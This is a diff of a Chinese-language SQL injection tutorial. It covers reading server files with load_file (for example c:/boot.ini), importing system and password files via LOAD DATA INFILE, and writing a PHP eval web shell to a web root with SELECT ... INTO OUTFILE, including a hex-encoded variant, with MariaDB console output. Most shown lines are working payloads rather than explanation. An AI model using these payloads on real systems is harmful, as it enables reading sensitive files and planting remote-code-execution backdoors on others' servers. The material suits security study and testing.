@@ -40,7 +40,7 @@ Explain：“c:/boot.ini”的16进制是“0x633a2f626f6f742e696e69”
 
 `-1 union select 1,1,1,load_file(c:\\boot.ini) `  
 
-Explain:路径里的/用 \\代替
+Explain:路径里的/用 \\\代替
 
 练习示例：   
 ```
@@ -69,12 +69,25 @@ this is  a test        |
 +---------------------------------------+
 1 row in set (0.00 sec)
 ```
-d:\\test.php 的16进制为 0x643A5C5C746573742E706870。
+d:\\\test.php 的16进制为 0x643A5C5C746573742E706870。
 
 ## 2. 文件导入到数据库  
 
 **LOAD DATA INFILE**    语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。  
 在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据库的权限时，可以将系统文件利用load data infile导入到数据库中。   
+
+基本语法：    
+```
+load data  [low_priority] [local] infile 'file_name txt' [replace | ignore]
+into table tbl_name
+[fields
+[terminated by't']
+[OPTIONALLY] enclosed by '']
+[escaped by'\' ]]
+[lines terminated by'n']
+[ignore number lines]
+[(col_name,   )]
+```
 
 示例：  
 ```
@@ -132,11 +145,11 @@ select  <?php @eval($_post[“mima”])?>  into outfile "c:\\phpnow\\htdocs\\tes
 select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16进制文件
 ```
 
-解释：通常是用‘\r\n’结尾，此处我们修改为自己想要的任何文件。同时可以用FIELDS TERMINATED BY  16进制可以为一句话或者其他任何的代码，可自行构造。在sqlmap中os-shell采取的就是这样的方式，具体可参考os-shell分析文章：http://www.cnblogs.com/lcamry/p/5505110.html 
+解释：通常是用‘\r\n’结尾，此处我们修改为自己想要的任何文件。同时可以用FIELDS TERMINATED BY  16进制可以为一句话或者其他任何的代码，可自行构造。在sqlmap中os-shell采取的就是这样的方式，具体可参考os-shell分析文章：http://www.cnblogs.com/lcamry/p/5505110.html  
+
 练习示例：    
 ```
-MariaDB [test]> select version() into outfile "d:\\test2.php" LINES TERMINATED B
-Y 0x3C3F70687020406576616C28245F706F73745BA1B06D696D61A1B15D293F3E;
+MariaDB [test]> select version() into outfile "d:\\test2.php" LINES TERMINATED BY 0x3C3F70687020406576616C28245F706F73745BA1B06D696D61A1B15D293F3E;
 Query OK, 1 row affected, 1 warning (0.01 sec)
 
 test2.php内容为：
